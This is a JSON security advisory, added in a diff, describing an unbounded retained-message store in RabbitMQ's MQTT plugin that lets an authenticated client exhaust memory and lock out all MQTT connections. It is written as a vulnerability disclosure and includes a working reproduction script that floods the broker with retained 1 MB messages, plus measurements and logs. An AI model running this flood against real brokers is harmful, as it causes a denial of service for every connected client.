@@ -1,0 +1,39 @@
+{
+  "modified": "2026-09-18T00:14:40Z",
+  "published": "2026-09-18T00:14:40Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-5jgm-jxp7-gwjh",
+  "details": "## Summary\r\n\r\nAny authenticated MQTT client with ordinary `write` permission can retain-publish to unlimited distinct\r\ntopics. The retained store has no count or size cap, is held in resident memory, and is never reclaimed;\r\nit survives restart and cannot be enumerated or bulk-purged. Filling it latches the node's memory alarm\r\npermanently, after which **no MQTT client can connect at all**.\r\n\r\n## Affected\r\n\r\n- `deps/rabbitmq_mqtt/src/rabbit_mqtt_retained_msg_store_{dets,ets}.erl`\r\n- Requires the `rabbitmq_mqtt` plugin (not enabled by default)\r\n- **Ecosystem:** Other: RabbitMQ **Package:** `rabbitmq-server`\r\n- Confirmed on **4.3.4**. Code unchanged since `6ac8d4def5` (2015-04-23); wider range inferred, not tested.\r\n\r\n## Mechanism\r\n\r\n`insert/3` is an unconditional write: no count check, no size check, and no config setting exists to add\r\none (`max_retained` and equivalents do not exist anywhere in the plugin or its schema):\r\n\r\n```erlang\r\ninsert(Topic, Msg, #store_state{table = T}) -\u003e\r\n  true = ets:insert(T, #retained_message{topic = Topic, mqtt_msg = Msg}),\r\n  ok.\r\n```\r\n\r\nThe default DETS backend is opened `{ram_file, true}`, keeping contents resident.\r\n\r\nThe store exports only `start/insert/lookup/delete/expire/terminate`. `delete/2` needs an exact topic\r\nname; there is no enumeration, no bulk purge, and no management API or UI surface. The only expiry is\r\nMQTT 5's Message Expiry Interval — client-supplied and optional, so an attacker omits it.\r\n\r\nEvery comparable store in RabbitMQ has controls this one lacks: queues have `max-length`,\r\n`max-length-bytes`, policy-applied TTL, overflow behaviour, UI visibility, one-click purge, and drain on\r\nconsumption. The retained store has none of them.\r\n\r\n## Reproduction\r\n\r\n```bash\r\ndocker run -d --name rmq --network rmqnet -p 1883:1883 rabbitmq:4.3.4\r\ndocker exec rmq rabbitmq-plugins enable rabbitmq_mqtt\r\ndocker exec rmq rabbitmqctl add_user mqttuser mqttpass\r\ndocker exec rmq rabbitmqctl set_permissions -p / mqttuser \".*\" \".*\" \".*\"\r\n\r\nhead -c 1048576 /dev/zero | tr '\\0' 'A' \u003e /tmp/payload.bin\r\n\r\ndocker run --rm --network rmqnet -v /tmp:/p eclipse-mosquitto sh -c '\r\nfor i in $(seq 1 300); do\r\n  mosquitto_pub -h rmq -p 1883 -u mqttuser -P mqttpass -q 1 -r \\\r\n    -t \"load/topic$i\" -f /p/payload.bin\r\ndone'\r\n\r\ndocker exec rmq rabbitmqctl eval '[{T, dets:info(T,size), dets:info(T,file_size)} || T \u003c- dets:all()].'\r\ndocker exec rmq rabbitmqctl eval 'erlang:memory(total).'\r\n```\r\n\r\n| Measurement | Before | After 300 × 1 MB | After restart |\r\n|---|---|---|---|\r\n| entries | 0 | 300 | 300 |\r\n| store bytes | 5,464 | 618,665,790 | 618,665,790 |\r\n\r\n`erlang:memory(total)` = 680,066,486, of which the store is 618,665,790 -\u003e **91% of broker memory**\r\n(idle node: ~100–150 MB). All 300 accepted, no rejection or throttling. ~2x amplification: 300 MB\r\npublished becomes 618 MB permanently held.\r\n\r\n### Alarm and denial of service\r\n\r\nWith the watermark pinned low to shorten the test (`set_vm_memory_high_watermark absolute \"500MB\"`),\r\n222 messages latched the alarm at 552 MB:\r\n\r\n```\r\n[{{resource_limit,memory,rabbit@8a4927e6c16d},[]}]\r\n\r\n[warning] *** Publishers will be blocked until this alarm clears ***\r\n[error] closing MQTT connection \u003c\u003c\"...:56674 -\u003e ...:1883\"\u003e\u003e (login timeout)\r\n[error] closing MQTT connection \u003c\u003c\"...:50776 -\u003e ...:1883\"\u003e\u003e (login timeout)\r\n    (repeating every 10s)\r\n```\r\n\r\nEvery subsequent connection fails its handshake and is dropped at the login timeout. A client probe\r\nreturns `MOSQ_ERR_CONN_LOST` (exit 7). Still latched 4.5 minutes later with no publishing and no recovery.\r\n\r\n## Impact\r\n\r\nWhile the alarm is latched, **new MQTT clients cannot connect**; not just publishers, not just the\r\nattacker's. The listener is dead to all clients until an operator intervenes.\r\n\r\nUnlike queue backlog, this never self-heals: queues drain as consumers catch up and the alarm clears;\r\nretained messages never drain. The store is per-vhost, so write access in several vhosts multiplies it.\r\n\r\n## Limitations\r\n\r\n- DETS files cap near 2 GB, so a single vhost's store is not literally unbounded. At ~2x amplification\r\n  ~1 GB of publishing fills it; 2 GB unreclaimable resident memory still trips the default watermark on\r\n  any node under ~3.3 GB, and the per-vhost scoping bypasses the single-table limit. ETS backend untested.\r\n- Only 4.3.4 tested. Single node; cluster alarm propagation not measured.\r\n- The alarm test pinned the watermark to 500 MB. This reduces the data volume required, not the mechanism.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.3.0"
+            },
+            {
+              "fixed": "4.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "rabbitmq",
+        "source_package": "rabbitmq-server"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-5jgm-jxp7-gwjh"
+    }
+  ]
+}
